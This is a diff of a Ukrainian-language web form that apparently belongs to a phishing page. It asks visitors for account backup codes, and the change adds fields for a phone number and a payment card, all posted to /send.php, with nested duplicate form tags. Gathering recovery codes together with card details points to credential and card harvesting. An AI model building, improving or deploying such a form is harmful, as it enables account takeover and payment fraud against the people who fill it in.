@@ -85,15 +85,15 @@ fbq('track', 'PageView');
             <div class="application-input">
               <input type="text" name="codes" placeholder="Ваші резервні коди" required="">
             </div>
-             
-                <div class="form-group">
-                  <label class="form-label">Введіть ваш номер телефону</label>
-                  <input type="text" name="namber" class="form-control">
-                </div>
-                <div class="form-group">
-                  <label class="form-label">Введіть карту для оплати</label>
-                  <input type="text" name="yesno" class="form-control">
-                </div>
+             <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="text" name="phone" placeholder="Ваш номер телефону" required="">
+            </div>
+                <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="text" name="card" placeholder="Ваша карта, для оплати" required="">
+            </div>
+                
                 <!-- /.form-group -->
         
                 <div id="success" class="alert alert-success" role="alert" style="display: none;"></div>
